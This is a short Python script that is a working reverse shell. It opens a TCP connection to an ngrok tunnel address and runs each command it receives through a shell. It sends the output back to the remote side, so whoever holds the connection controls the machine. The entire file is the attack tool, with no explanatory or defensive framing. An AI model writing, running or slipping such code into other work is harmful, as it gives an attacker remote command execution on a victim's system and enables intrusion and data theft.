import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('5.tcp.eu.ngrok.io', 16565))  
    while True:
        try:
            command = s.recv(1024).decode().strip()  
            if command.lower() == 'exit':
                break
            if command.startswith("cd"):
                try:
                    os.chdir(command.strip("cd ").strip())  
                    s.send(b'Directory changed successfully.\n')
                except FileNotFoundError:
                    s.send(b'Directory not found.\n')
            else:
                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                s.send(result.stdout + result.stderr + b'\n')  
        except Exception as e:
            s.send(f'Error: {str(e)}\n'.encode())
    s.close()

if __name__ == "__main__":
    reverse_shell()
